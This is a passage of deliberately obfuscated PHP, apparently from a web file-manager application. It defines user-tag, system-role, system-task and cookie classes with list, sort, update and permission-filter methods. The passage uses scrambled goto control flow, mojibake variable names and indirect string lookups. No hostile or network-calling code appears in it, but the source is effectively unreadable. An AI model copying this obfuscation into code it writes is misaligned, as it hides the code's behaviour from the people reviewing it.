$this->_listDataApply($FÊ‰•Ó¶‰Å[$C®³‘Š‚Ô»[363]]); goto CãÂ­ôÔŒÛ; f©ŠÔö‰öœ: $D‰íàÆÙç³ = str_replace($C®³‘Š‚Ô»[1744], $C®³‘Š‚Ô»[1745], trim($D‰íàÆÙç³)); $F›äÒŞ§¨ = array($C®³‘Š‚Ô»[28] => array($C®³‘Š‚Ô»[375], "\45{$D‰íàÆÙç³}\45"), $C®³‘Š‚Ô»[301] => array($C®³‘Š‚Ô»[375], "{$D‰íàÆÙç³}\45"), $C®³‘Š‚Ô»[1921] => array($C®³‘Š‚Ô»[375], "{$D‰íàÆÙç³}\x25"), $C®³‘Š‚Ô»[934] => $C®³‘Š‚Ô»[1746]); if (Input::check($D‰íàÆÙç³, $C®³‘Š‚Ô»[307])) { $F›äÒŞ§¨[$C®³‘Š‚Ô»[1498]] = array($C®³‘Š‚Ô»[375], "{$D‰íàÆÙç³}\x25"); $F›äÒŞ§¨[$C®³‘Š‚Ô»[2094]] = array($C®³‘Š‚Ô»[375], "{$D‰íàÆÙç³}\x25"); } goto FÁ“ÛÍ¿ñç; e›§ò‚…ƒ: } private function _filterByGroup(&$Cî‘Ü¦×Ì, $EÈÛÚİÅ) { $a–‘ºğÍğ§ =& $_SERVER[¢ÌÛ]; if (!$EÈÛÚİÅ) { return $Cî‘Ü¦×Ì; } foreach ($Cî‘Ü¦×Ì[$a–‘ºğÍğ§[363]] as $C“Â¹š„‘— => &$D†²Ş¸Äù) { $fä–†¾—— = array_to_keyvalue($D†²Ş¸Äù[$a–‘ºğÍğ§[1832]], $a–‘ºğÍğ§[33], $a–‘ºğÍğ§[1657]); if (!in_array($EÈÛÚİÅ, $fä–†¾——)) { unset($Cî‘Ü¦×Ì[$a–‘ºğÍğ§[363]][$C“Â¹š„‘—]); } } unset($D†²Ş¸Äù); $Cî‘Ü¦×Ì[$a–‘ºğÍğ§[363]] = array_values($Cî‘Ü¦×Ì[$a–‘ºğÍğ§[363]]); $Cî‘Ü¦×Ì[$a–‘ºğÍğ§[360]] = array($a–‘ºğÍğ§[1894] => count($Cî‘Ü¦×Ì[$a–‘ºğÍğ§[363]]), $a–‘ºğÍğ§[1892] => $Cî‘Ü¦×Ì[$a–‘ºğÍğ§[360]][$a–‘ºğÍğ§[358]], $a–‘ºğÍğ§[1891] => 1, $a–‘ºğÍğ§[1893] => 1); } private function _searchFromMeta($cœİµ“ÂÏƒ, $Bó“…Ê‹•Ö, $f±«¾µ¥º·) { goto Bã¦ëÃÉ; EˆæºÛÖ—: $D¨”¬°»Í = array_to_keyvalue($D¨”¬°»Í, $f¥·ó™·Š[33], $f¥·ó™·Š[1498]); $DÂÇæùæ™ = $this->where(array($f¥·ó™·Š[1490] => array($f¥·ó™·Š[7], $D¨”¬°»Í)))->select(); if (!$DÂÇæùæ™) { return array(); } goto a’ù¼åæÎ‹; a’ù¼åæÎ‹: return $DÂÇæùæ™; goto e›ä‡ç¨Ó; Bã¦ëÃÉ: $f¥·ó™·Š =& $_SERVER[¢ÌÛ]; $Bó“…Ê‹•Ö = strtolower($Bó“…Ê‹•Ö); $B‚àåĞë¨² = array($f¥·ó™·Š[92] => $cœİµ“ÂÏƒ, $f¥·ó™·Š[368] => array($f¥·ó™·Š[375], "\x25{$Bó“…Ê‹•Ö}\x25")); goto Bİ‹ö¾ª; Bİ‹ö¾ª: $B‚àåĞë¨² = $this->parseWhereLike($B‚àåĞë¨²); $D¨”¬°»Í = Model($f¥·ó™·Š[2114])->where($B‚àåĞë¨²)->limit($f±«¾µ¥º·)->select(); if (!$D¨”¬°»Í) { return array(); } goto EˆæºÛÖ—; e›ä‡ç¨Ó: } private function _listDataApplyItem($c¤è™ÉÓÇÜ) { $e—èƒöò¿— = array($c¤è™ÉÓÇÜ); $this->_listDataApply($e—èƒöò¿—); return $e—èƒöò¿—[0]; } private function _listDataApply(&$BŠîÏ¤ˆš) { goto cöë¢©ÕÎÆ; cöë¢©ÕÎÆ: $eË…¡®ƒ§ =& $_SERVER[¢ÌÛ]; if (!$BŠîÏ¤ˆš) { return; } array_remove_key($BŠîÏ¤ˆš, $eË…¡®ƒ§[826]); goto B·Ğïñ¼¡ã; aê•è›ÇÖ: $this->_listAppendSourceRoot($BŠîÏ¤ˆš, $a›–á«ä×ó); goto E¢îŒ©À™‹; B·Ğïñ¼¡ã: $a›–á«ä×ó = array_to_keyvalue($BŠîÏ¤ˆš, $eË…¡®ƒ§[33], $eË…¡®ƒ§[1498]); $this->_listAppendGroup($BŠîÏ¤ˆš, $a›–á«ä×ó); $this->_listAppendMeta($BŠîÏ¤ˆš, $a›–á«ä×ó); goto aê•è›ÇÖ; E¢îŒ©À™‹: } private function _listAppendSourceRoot(&$AÉ½¿÷öŸ¯, $FÊ¦¿™ª¾³) { goto BÑŒë‡ó¾; BÑŒë‡ó¾: $bŒÃ³Å×¢ =& $_SERVER[¢ÌÛ]; $CĞéëõ«Û = array($bŒÃ³Å×¢[488] => 0, $bŒÃ³Å×¢[398] => SourceModel::TYPE_USER, $bŒÃ³Å×¢[483] => array($bŒÃ³Å×¢[7], $FÊ¦¿™ª¾³)); $C’ï±Š¹§Î = $bŒÃ³Å×¢[1753]; goto eçòÊÙ¸; Fïé¹ŠÒê‚: foreach ($AÉ½¿÷öŸ¯ as &$c”ß†ù–¢ë) { $c”ß†ù–¢ë[$bŒÃ³Å×¢[84]] = $a®£¦å¦¤–[$c”ß†ù–¢ë[$bŒÃ³Å×¢[1498]]] ? $a®£¦å¦¤–[$c”ß†ù–¢ë[$bŒÃ³Å×¢[1498]]] : array(); } unset($c”ß†ù–¢ë); goto DÏ¦Š ğò; eçòÊÙ¸: $a®£¦å¦¤– = Model($bŒÃ³Å×¢[774])->order($bŒÃ³Å×¢[1754])->field($C’ï±Š¹§Î)->where($CĞéëõ«Û)->select(); $a®£¦å¦¤– = array_to_keyvalue($a®£¦å¦¤–, $bŒÃ³Å×¢[483]); $a®£¦å¦¤– = array_remove_key($a®£¦å¦¤–, $bŒÃ³Å×¢[483]); goto Fïé¹ŠÒê‚; DÏ¦Š ğò: } private function _listAppendGroup(&$cĞ‚ˆ­† , $B„Õ©½ØÑÌ) { goto d¹„¶Á¶–ë; d†âŒÈ“ùõ: foreach ($cĞ‚ˆ­†  as &$AšÏ ¢¦™‡) { $AšÏ ¢¦™‡[$Cº˜íçß¢‘[1832]] = array(); if (isset($a¹¤„ãñ¢›[$AšÏ ¢¦™‡[$Cº˜íçß¢‘[1498]]])) { $AšÏ ¢¦™‡[$Cº˜íçß¢‘[1832]] = $a¹¤„ãñ¢›[$AšÏ ¢¦™‡[$Cº˜íçß¢‘[1498]]]; } } unset($AšÏ ¢¦™‡); goto DÕŒŒµˆŠ²; a†‰ÊºŞ¹: $d­Œ‡·ÔÆÖ = array_to_keyvalue($a¹¤„ãñ¢›, $Cº˜íçß¢‘[33], $Cº˜íçß¢‘[1657]); $d­Œ‡·ÔÆÖ = array_remove_value(array_unique($d­Œ‡·ÔÆÖ), $Cº˜íçß¢‘[495]); if (!$d­Œ‡·ÔÆÖ || !$a¹¤„ãñ¢›) { return; } goto C•³¯†ëâ‚; C•³¯†ëâ‚: $AÒÖù†§•Ã = array($Cº˜íçß¢‘[1657] => array($Cº˜íçß¢‘[7], $d­Œ‡·ÔÆÖ)); $D…ğ¹¼ƒ´¢ = Model($Cº˜íçß¢‘[1830])->field($Cº˜íçß¢‘[2115])->where($AÒÖù†§•Ã)->select(); $D…ğ¹¼ƒ´¢ = array_to_keyvalue($D…ğ¹¼ƒ´¢, $Cº˜íçß¢‘[1657]); goto Aõ¤ÜŸ©; d¹„¶Á¶–ë: $Cº˜íçß¢‘ =& $_SERVER[¢ÌÛ]; $AÒÖù†§•Ã = array($Cº˜íçß¢‘[1498] => array($Cº˜íçß¢‘[7], $B„Õ©½ØÑÌ)); $a¹¤„ãñ¢› = Model($Cº˜íçß¢‘[1740])->where($AÒÖù†§•Ã)->select(); goto a†‰ÊºŞ¹; Aõ¤ÜŸ©: $a¹¤„ãñ¢› = array_to_keyvalue_group($a¹¤„ãñ¢›, $Cº˜íçß¢‘[1498]); foreach ($a¹¤„ãñ¢› as &$bÉîÂö´áå) { $eâ´òÒÔ¯Ö = array(); foreach ($bÉîÂö´áå as $B…‰›ôŠ¶š) { if (!$B…‰›ôŠ¶š[$Cº˜íçß¢‘[1806]]) { continue; } $E†ŠçôÒå = Model($Cº˜íçß¢‘[1825])->listData($B…‰›ôŠ¶š[$Cº˜íçß¢‘[1806]]); $eâ´òÒÔ¯Ö[] = array($Cº˜íçß¢‘[1657] => $B…‰›ôŠ¶š[$Cº˜íçß¢‘[1657]], $Cº˜íçß¢‘[2116] => $D…ğ¹¼ƒ´¢[$B…‰›ôŠ¶š[$Cº˜íçß¢‘[1657]]][$Cº˜íçß¢‘[28]], $Cº˜íçß¢‘[486] => $D…ğ¹¼ƒ´¢[$B…‰›ôŠ¶š[$Cº˜íçß¢‘[1657]]][$Cº˜íçß¢‘[486]], $Cº˜íçß¢‘[403] => $E†ŠçôÒå); } $bÉîÂö´áå = $eâ´òÒÔ¯Ö; } unset($bÉîÂö´áå); goto d†âŒÈ“ùõ; DÕŒŒµˆŠ²: } private function _listAppendMeta(&$fÏëóèØ½¬, $CÜÊ™ºº„ç) { goto aÑß‚Á™Ä²; eç¥¢ÎâêÊ: foreach ($eÔçÀ©ô½† as &$b½Îß”ŒŠ) { $cæƒ¯Û«Óó = array(); foreach ($b½Îß”ŒŠ as $DÑåõ¬İÆ¤) { if (!in_array($DÑåõ¬İÆ¤[$B¨‡«‚„‹[92]], $aÍ¾À¾šÊ)) { $cæƒ¯Û«Óó[$DÑåõ¬İÆ¤[$B¨‡«‚„‹[92]]] = $DÑåõ¬İÆ¤[$B¨‡«‚„‹[368]]; } } $b½Îß”ŒŠ = $cæƒ¯Û«Óó; } unset($b½Îß”ŒŠ); $fá”Ú¼•Æ¸ = Model($B¨‡«‚„‹[2117]); goto A‹Õˆ›šÊ¢; A‹Õˆ›šÊ¢: foreach ($fÏëóèØ½¬ as &$b´µÂ–Ç‡) { $bÀ¹»‘¾†† = array(); if (isset($eÔçÀ©ô½†[$b´µÂ–Ç‡[$B¨‡«‚„‹[1498]]])) { $bÀ¹»‘¾†† = $eÔçÀ©ô½†[$b´µÂ–Ç‡[$B¨‡«‚„‹[1498]]]; } $b´µÂ–Ç‡[$B¨‡«‚„‹[2118]] = array(); if (isset($bÀ¹»‘¾††[$FíóîÜº¶ñ])) { $b´µÂ–Ç‡[$B¨‡«‚„‹[2118]] = $fá”Ú¼•Æ¸->getUserJobInfo($bÀ¹»‘¾††[$FíóîÜº¶ñ]); } } unset($b´µÂ–Ç‡); goto c’ã×Æ«øì; aÑß‚Á™Ä²: $B¨‡«‚„‹ =& $_SERVER[¢ÌÛ]; $FíóîÜº¶ñ = UserJobModel::JOB_KEY; $aÍ¾À¾šÊ = array($B¨‡«‚„‹[2095]); goto D©Ö™‰ª²È; D©Ö™‰ª²È: $eó†ğáİ = array($B¨‡«‚„‹[1498] => array($B¨‡«‚„‹[7], $CÜÊ™ºº„ç)); $eÔçÀ©ô½† = Model($B¨‡«‚„‹[2093])->where($eó†ğáİ)->select(); $eÔçÀ©ô½† = array_to_keyvalue_group($eÔçÀ©ô½†, $B¨‡«‚„‹[1498]); goto eç¥¢ÎâêÊ; c’ã×Æ«øì: } protected function groupUserAll($b§ÈÉö‰‘¾) { $d‘£áŒ¾¶ë =& $_SERVER[¢ÌÛ]; if (!$b§ÈÉö‰‘¾) { return !1; } $eÖÇ³±¸„ë = Model($d‘£áŒ¾¶ë[1740])->field($d‘£áŒ¾¶ë[1498])->where(array($d‘£áŒ¾¶ë[1657] => array($d‘£áŒ¾¶ë[7], $b§ÈÉö‰‘¾)))->select(); $eÖÇ³±¸„ë = array_to_keyvalue($eÖÇ³±¸„ë, $d‘£áŒ¾¶ë[33], $d‘£áŒ¾¶ë[1498]); return array_unique($eÖÇ³±¸„ë); } public function userSearch($E†ËãÁ”Ø«, $dœÈÎ§¹…ä = "\52") { return Model($_SERVER[¢ÌÛ][504])->where($E†ËãÁ”Ø«)->field($dœÈÎ§¹…ä)->find(); } } goto f„„‡çŠª; f„„‡çŠª: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\137\157\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Béƒ‘ƒùÔŒ) { $dŒÃµ‰ë‘Ô =& $_SERVER[¢ÌÛ]; if (!defined($dŒÃµ‰ë‘Ô[452])) { define($dŒÃµ‰ë‘Ô[452], 0); } return "\125\163\145\x72\117\160\x74\x69\x6f\x6e\137{$Béƒ‘ƒùÔŒ}\137" . USER_ID; } protected function filterWhere($cÌòòÍï–ò) { $DÙÇÈ˜š =& $_SERVER[¢ÌÛ]; if (!defined($DÙÇÈ˜š[452])) { define($DÙÇÈ˜š[452], 0); } $cÌòòÍï–ò[$DÙÇÈ˜š[1498]] = USER_ID; return $cÌòòÍï–ò; } public function cacheRemoveUser($B¶Í”àª‚Ö, $Dø‚Ë†Ó²) { return Cache::remove("\125\163\145\x72\x4f\160\164\x69\x6f\x6e\x5f{$B¶Í”àª‚Ö}\137" . $Dø‚Ë†Ó²); } protected function optionDefault($dï÷ãèŠÆ° = '') { $AÛ‘‹’ôÊ =& $_SERVER[¢ÌÛ]; if ($dï÷ãèŠÆ° == $AÛ‘‹’ôÊ[33]) { return $GLOBALS[$AÛ‘‹’ôÊ[6]][$AÛ‘‹’ôÊ[2119]]; } if ($dï÷ãèŠÆ° == $AÛ‘‹’ôÊ[2120]) { return $GLOBALS[$AÛ‘‹’ôÊ[6]][$AÛ‘‹’ôÊ[2121]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\x74\x61\x67\114\x69\x73\x74"; public $modelType = "\x55\163\145\x72\x4f\160\x74\x69\157\156"; public $field = array("\x6e\141\155\145", "\163\164\171\154\x65", "\163\x6f\162\164"); public function listData($C÷ØÑøœÍÊ = false, $aä¥–õó¡ö = "\163\x6f\x72\164", $eâ«Ò †»© = false) { return parent::listData($C÷ØÑøœÍÊ, $aä¥–õó¡ö, $eâ«Ò †»©); } public function remove($BÚ“‹›é) { return parent::remove($BÚ“‹›é); } public function add($cŸ²Ã…õİ, $eÉ„ğÑê¹× = "\154\x61\142\145\x6c\55\x67\162\145\171\x2d\x6e\x6f\x72\x6d\x61\x6c") { $f¿ÉÄ³Æ–  =& $_SERVER[¢ÌÛ]; if ($this->findByName($cŸ²Ã…õİ)) { return !1; } $D¶Áâ’¬»â = array($f¿ÉÄ³Æ– [413] => $cŸ²Ã…õİ, $f¿ÉÄ³Æ– [462] => $eÉ„ğÑê¹×, $f¿ÉÄ³Æ– [1661] => $this->getSort($f¿ÉÄ³Æ– [254]) + 1); return parent::insert($D¶Áâ’¬»â); } public function update($Cí÷¼Ğä›ä, $FÉ²ËÁ°‹) { $f½ŒÂÓÇ´ =& $_SERVER[¢ÌÛ]; $BÄÌ‰éÚ« = $this->listData($Cí÷¼Ğä›ä); $bíÒÖƒÂö· = $this->findByName($FÉ²ËÁ°‹[$f½ŒÂÓÇ´[28]]); if (!$BÄÌ‰éÚ« || $bíÒÖƒÂö· && $bíÒÖƒÂö·[$f½ŒÂÓÇ´[385]] != $BÄÌ‰éÚ«[$f½ŒÂÓÇ´[385]]) { return !1; } return parent::update($Cí÷¼Ğä›ä, $FÉ²ËÁ°‹); } public function moveTop($f®˜¦¾ï”ˆ) { $cË‚ŸÅô¼¦ =& $_SERVER[¢ÌÛ]; $dÎöŠƒóÓ® = parent::listData(); $C‡Ô¢óÙ‹ = $this->getSort($cË‚ŸÅô¼¦[253]); foreach ($dÎöŠƒóÓ® as &$A«åí¥®™¶) { if ($A«åí¥®™¶[$cË‚ŸÅô¼¦[385]] == $f®˜¦¾ï”ˆ) { $A«åí¥®™¶[$cË‚ŸÅô¼¦[1680]] = $C‡Ô¢óÙ‹; continue; } $A«åí¥®™¶[$cË‚ŸÅô¼¦[1680]] += 1; } unset($A«åí¥®™¶); return parent::resetData($dÎöŠƒóÓ®); } public function moveBottom($Aœ£¤—Ğø) { $aºóóŒ»æ¤ =& $_SERVER[¢ÌÛ]; $C¶¤èÃÂØ˜ = $this->getSort($aºóóŒ»æ¤[254]) + 1; return parent::update($Aœ£¤—Ğø, array($aºóóŒ»æ¤[1680] => $C¶¤èÃÂØ˜)); } public function resetSort($aÉ‡¢°½º–) { goto EÒäŒšÇ‡â; BåµÙÀ”ôÀ: for ($A…Ò†åÖø = 0; $A…Ò†åÖø < count($aÉ‡¢°½º–); $A…Ò†åÖø++) { $B¬ŸßÍø[$aÉ‡¢°½º–[$A…Ò†åÖø] . $c´¤ÓÇ¶Ô[33]] = $A…Ò†åÖø + 1; } $DÍÖ³æƒÑå = parent::listData(); foreach ($DÍÖ³æƒÑå as &$A‹¦Å¿é½¸) { $EÍì¹Œ‹Ó = $B¬ŸßÍø[$A‹¦Å¿é½¸[$c´¤ÓÇ¶Ô[385]]]; $A‹¦Å¿é½¸[$c´¤ÓÇ¶Ô[1680]] = $EÍì¹Œ‹Ó ? $EÍì¹Œ‹Ó : $A‹¦Å¿é½¸[$c´¤ÓÇ¶Ô[1680]]; } goto bÌà¬´°¹µ; bÌà¬´°¹µ: unset($A‹¦Å¿é½¸); return parent::resetData($DÍÖ³æƒÑå); goto bø½¨‰¾´ò; EÒäŒšÇ‡â: $c´¤ÓÇ¶Ô =& $_SERVER[¢ÌÛ]; $B¬ŸßÍø = array(); $aÉ‡¢°½º– = is_array($aÉ‡¢°½º–) ? $aÉ‡¢°½º– : array(); goto BåµÙÀ”ôÀ; bø½¨‰¾´ò: } private function getSort($aÍÛ¬áÈ‡‹) { $Cœ«µ¤– =& $_SERVER[¢ÌÛ]; $aÎ²«ã¸½‡ = parent::listData(); $bŠõß†ê™ = array_to_keyvalue($aÎ²«ã¸½‡, $Cœ«µ¤–[33], $Cœ«µ¤–[1680]); if (!$bŠõß†ê™) { $bŠõß†ê™ = array(0); } $D÷¼ßÅ‘ö = $aÍÛ¬áÈ‡‹ == $Cœ«µ¤–[254] ? max($bŠõß†ê™) : min($bŠõß†ê™); return intval($D÷¼ßÅ‘ö); } } goto Dª¯Î÷“àÛ; bÖªàâù­è: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\162\157\154\x65\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\141\x75\x74\x68", "\154\141\142\145\154", "\x64\151\163\160\154\x61\x79", "\x73\171\x73\164\x65\x6d", "\x64\145\x73\x63", "\151\x67\x6e\157\162\x65\105\170\x74", "\151\x67\156\157\162\145\x46\x69\x6c\145\x53\x69\x7a\145", "\141\x64\x6d\x69\x6e\151\163\x74\x72\141\x74\x6f\x72", "\x73\157\162\164"); public function listData($cŞÔÔğ¶† = false, $fœÃŠš®ÕÇ = "\163\157\162\164", $DƒÆŠœª¹ = false) { $Fš›³Ê›¼¿ =& $_SERVER[¢ÌÛ]; $EµÓÅ¢‘ó = parent::listData($cŞÔÔğ¶†, $fœÃŠš®ÕÇ, $DƒÆŠœª¹); if (!$cŞÔÔğ¶†) { $E§Â¯…Ê = $Fš›³Ê›¼¿[2064]; foreach ($EµÓÅ¢‘ó as $AÅ„¦ÍÚ => $BµÜùÑÓ‰î) { if ($BµÜùÑÓ‰î[$Fš›³Ê›¼¿[1847]] == 1) { $EµÓÅ¢‘ó[$AÅ„¦ÍÚ][$Fš›³Ê›¼¿[431]] = $E§Â¯…Ê; } } } return $EµÓÅ¢‘ó; } public function update($EÙ¨ÎÑ²‹, $EÂˆ•‰í) { goto e†©‘ŸÛö; B¾ÚßÀ¢Û: if (!$C¥‹Ç–¬Ê… || $eá†­Åœ– && $eá†­Åœ–[$fÉá¡†ÃËŒ[385]] != $C¥‹Ç–¬Ê…[$fÉá¡†ÃËŒ[385]]) { return !1; } if ($eá†­Åœ–[$fÉá¡†ÃËŒ[1847]] == 1) { $EÂˆ•‰í = array($fÉá¡†ÃËŒ[28] => $EÂˆ•‰í[$fÉá¡†ÃËŒ[28]], $fÉá¡†ÃËŒ[1678] => $EÂˆ•‰í[$fÉá¡†ÃËŒ[1678]]); } $this->filterAuth($EÂˆ•‰í[$fÉá¡†ÃËŒ[403]]); goto AßªĞó‰¥; AßªĞó‰¥: return parent::update($EÙ¨ÎÑ²‹, $EÂˆ•‰í); goto CâÄ¥Ä¸Ú; e†©‘ŸÛö: $fÉá¡†ÃËŒ =& $_SERVER[¢ÌÛ]; $C¥‹Ç–¬Ê… = parent::listData($EÙ¨ÎÑ²‹); $eá†­Åœ– = $this->findByName($EÂˆ•‰í[$fÉá¡†ÃËŒ[28]]); goto B¾ÚßÀ¢Û; CâÄ¥Ä¸Ú: } public function remove($DµÕŒÒ’İ) { $BİÆÂº—ó½ = parent::listData($DµÕŒÒ’İ); if (!$BİÆÂº—ó½ || $BİÆÂº—ó½[$_SERVER[¢ÌÛ][1142]]) { return !1; } return parent::remove($DµÕŒÒ’İ); } public function add($Cª½ÎÛÛ¡ˆ) { goto cÕğ“«á; D‚“‘‰ï”: return parent::insert($Cª½ÎÛÛ¡ˆ); goto Aƒ‡ŠÈİÉƒ; cÕğ“«á: $aÆ…Ø½‘Ñ³ =& $_SERVER[¢ÌÛ]; $C·×‰·‹ß = $Cª½ÎÛÛ¡ˆ[$aÆ…Ø½‘Ñ³[28]]; if ($this->findByName($C·×‰·‹ß)) { return !1; } goto D¿Í¹Ñ‹®; D¿Í¹Ñ‹®: $Dä¢¹ŠÒ´Ş = array($aÆ…Ø½‘Ñ³[413] => $C·×‰·‹ß, $aÆ…Ø½‘Ñ³[1663] => $aÆ…Ø½‘Ñ³[33], $aÆ…Ø½‘Ñ³[1659] => $aÆ…Ø½‘Ñ³[1667], $aÆ…Ø½‘Ñ³[2065] => 1, $aÆ…Ø½‘Ñ³[1662] => 0, $aÆ…Ø½‘Ñ³[2066] => 0, $aÆ…Ø½‘Ñ³[1661] => $this->getSort()); $Cª½ÎÛÛ¡ˆ = array_merge($Dä¢¹ŠÒ´Ş, $Cª½ÎÛÛ¡ˆ); $this->filterAuth($Cª½ÎÛÛ¡ˆ[$aÆ…Ø½‘Ñ³[403]]); goto D‚“‘‰ï”; Aƒ‡ŠÈİÉƒ: } private function getSort() { $aâÇ‹šÚÂä =& $_SERVER[¢ÌÛ]; $Bœï±‰Ø« = parent::listData(); $dÛ˜¢çÜğƒ = array_to_keyvalue($Bœï±‰Ø«, $aâÇ‹šÚÂä[33], $aâÇ‹šÚÂä[1680]); return empty($dÛ˜¢çÜğƒ) ? 0 : max($dÛ˜¢çÜğƒ) + 1; } private function filterAuth(&$Eê„ä¢½‹Ö) { $b½³Ô‹İ©× =& $_SERVER[¢ÌÛ]; $C¼Û±“±ƒ® = array(); $FœÜ½Á¿Ö = array_filter(explode($b½³Ô‹İ©×[47], $Eê„ä¢½‹Ö)); foreach ($FœÜ½Á¿Ö as $Eê„ä¢½‹Ö) { $d‘øòççÉ° = explode($b½³Ô‹İ©×[94], $Eê„ä¢½‹Ö); if ($d‘øòççÉ°[0] == $b½³Ô‹İ©×[2067] && $d‘øòççÉ°[1] != $b½³Ô‹İ©×[1066]) { $dİ‚ß¹‡… = $d‘øòççÉ°[0] . $b½³Ô‹İ©×[94] . $d‘øòççÉ°[1] . $b½³Ô‹İ©×[2068]; if (!in_array($dİ‚ß¹‡…, $FœÜ½Á¿Ö)) { $C¼Û±“±ƒ®[] = $dİ‚ß¹‡…; } } $C¼Û±“±ƒ®[] = $Eê„ä¢½‹Ö; } $Eê„ä¢½‹Ö = implode($b½³Ô‹İ©×[47], $C¼Û±“±ƒ®); } public function sort($EÔ¾±‹ÛÈÕ, $F ‹…ƒ–×¬) { return parent::update($EÔ¾±‹ÛÈÕ, $F ‹…ƒ–×¬); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\164\141\x73\153\x4c\151\163\164"; public $field = array("\156\x61\x6d\x65", "\164\171\160\x65", "\145\x76\x65\156\x74", "\164\151\155\145", "\x64\145\x73\143", "\x73\x79\163\x74\x65\155", "\x65\x6e\141\x62\154\145", "\x6c\141\163\x74\x52\x75\156", "\x73\157\162\164"); public function listData($F”‡÷ò˜ª¤ = false, $cì°¦¥¾ÄÔ = "\x73\x6f\x72\164", $bò³ôÔ¹ß = false) { return parent::listData($F”‡÷ò˜ª¤, $cì°¦¥¾ÄÔ, $bò³ôÔ¹ß); } public function add($Cò‘Üæ…¥) { $f¿Üİö„êÓ =& $_SERVER[¢ÌÛ]; $E¢ÌÈ»ñ¢ = $this->findByName($Cò‘Üæ…¥[$f¿Üİö„êÓ[28]]); if ($E¢ÌÈ»ñ¢) { return !1; } $Cò‘Üæ…¥[$f¿Üİö„êÓ[1462]] = 0; $Cò‘Üæ…¥[$f¿Üİö„êÓ[1680]] = $this->getSort(); return parent::insert($Cò‘Üæ…¥); } private function getSort() { $d®£¹Ïõ˜ =& $_SERVER[¢ÌÛ]; $fÊ”ÀœîÜ… = parent::listData(); $cñ¦¡á–ö¨ = array_to_keyvalue($fÊ”ÀœîÜ…, $d®£¹Ïõ˜[33], $d®£¹Ïõ˜[1680]); return empty($cñ¦¡á–ö¨) ? 0 : max($cñ¦¡á–ö¨) + 1; } public function update($F›½Öƒ¶¶¶, $c˜»¢—·ø) { $eòÑƒÅ”Ó¿ =& $_SERVER[¢ÌÛ]; $DªÎ¬¨êÀì = $this->listData($F›½Öƒ¶¶¶); $aØ†Òõ´™Œ = $this->findByName($c˜»¢—·ø[$eòÑƒÅ”Ó¿[28]]); if (!$DªÎ¬¨êÀì || $aØ†Òõ´™Œ && $aØ†Òõ´™Œ[$eòÑƒÅ”Ó¿[385]] != $DªÎ¬¨êÀì[$eòÑƒÅ”Ó¿[385]]) { return !1; } return parent::update($F›½Öƒ¶¶¶, $c˜»¢—·ø); } public function remove($Fï·³Œèƒ­, $d±¨×È¾ = false) { $f¾œôƒÅÁõ =& $_SERVER[¢ÌÛ]; $DºäƒÙæØø = $this->listData($Fï·³Œèƒ­); if (!$DºäƒÙæØø) { return; } if (!$d±¨×È¾ && $DºäƒÙæØø[$f¾œôƒÅÁõ[1142]] == $f¾œôƒÅÁõ[86]) { return !1; } return parent::remove($Fï·³Œèƒ­); } public function enable($FÖ•¯òåµ, $EÔ‰†ƒ·È) { return $this->update($FÖ•¯òåµ, array($_SERVER[¢ÌÛ][2059] => $EÔ‰†ƒ·È)); } public function run($c¹ë‹µ×¯˜) { return $this->update($c¹ë‹µ×¯˜, array($_SERVER[¢ÌÛ][2069] => time())); } } goto FÓÃˆŞ¢Ô; bïæ£âÍ²ù: define($_SERVER[¢ÌÛ][235], 2); define($_SERVER[¢ÌÛ][236], 3); define($_SERVER[¢ÌÛ][237], 1); goto cÆÎë¯ñŒµ; C»øÚ¿¯º : class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($A½„Á÷®êà = '', $EÒºæÌÆÈ = 0) { if (is_string($A½„Á÷®êà) && $A½„Á÷®êà != $_SERVER[¢ÌÛ][33]) { $this->prefix = $A½„Á÷®êà; } if (is_numeric($EÒºæÌÆÈ) && $EÒºæÌÆÈ > 0) { $this->expire = $EÒºæÌÆÈ; } } public static function getInstance() { static $dî¹ ®Æ–; if ($dî¹ ®Æ– === null) { $dî¹ ®Æ– = new self(); } return $dî¹ ®Æ–; } private static $cookieDisable = false; public static function disable($E¥ÊÕğÁ¶—) { self::$cookieDisable = $E¥ÊÕğÁ¶—; } private static $sameCookieSet = array(); public static function set($B‚ì¨Ÿ¯Ÿ, $b’ß¥ÉŒ·Ø, $Eïªæà©Ÿ = 0, $F©ÓÅ­õ‰İ = false, $D„§¤¤œìè = false) { goto dÑòÑßâˆ; d‰†¥ê¶¾¢: $b—¯¥è²‹Š = $D‡¼ˆ«ó¦·[33]; setcookie($B‚ì¨Ÿ¯Ÿ, $b’ß¥ÉŒ·Ø, time() + $Eïªæà©Ÿ, $D‡¼ˆ«ó¦·[8] . trim($D„§¤¤œìè, $D‡¼ˆ«ó¦·[8]) . $b—¯¥è²‹Š, !1, !1, $F©ÓÅ­õ‰İ); goto f…ˆ•¬©Î›; dÑòÑßâˆ: $D‡¼ˆ«ó¦· =& $_SERVER[¢ÌÛ]; if (self::$cookieDisable) { return; } if (!$Eïªæà©Ÿ) { $Eïªæà©Ÿ = 24 * 3600 * 7; } goto e÷Õ¬ã›À»; e÷Õ¬ã›À»: if (isset(self::$sameCookieSet[$B‚ì¨Ÿ¯Ÿ]) && self::$sameCookieSet[$B‚ì¨Ÿ¯Ÿ] == $b’ß¥ÉŒ·Ø . $Eïªæà©Ÿ) { return; } self::$sameCookieSet[$B‚ì¨Ÿ¯Ÿ] = $b’ß¥ÉŒ·Ø . $Eïªæà©Ÿ; if (!$D„§¤¤œìè) { $D„§¤¤œìè = str_replace(HOST, $D‡¼ˆ«ó¦·[33], APP_HOST); $D„§¤¤œìè = _get($GLOBALS, $D‡¼ˆ«ó¦·[820], $D„§¤¤œìè); } goto d‰†¥ê¶¾¢; f…ˆ•¬©Î›: } public static function setSafe($C¾àÖ¡§›ä, $CÃÙÚêƒ½Î, $d„ÇµÔ›â = 0) { self::set($C¾àÖ¡§›ä, $CÃÙÚêƒ½Î, $d„ÇµÔ›â, !0); } public static function get($BîÃŠì¡•Ö) { return isset($_COOKIE[$BîÃŠì¡•Ö]) ? $_COOKIE[$BîÃŠì¡•Ö] : !1; } public static function remove($A°õÜÈÁ¤®, $CÂ»äÆÆ…¹ = false) { 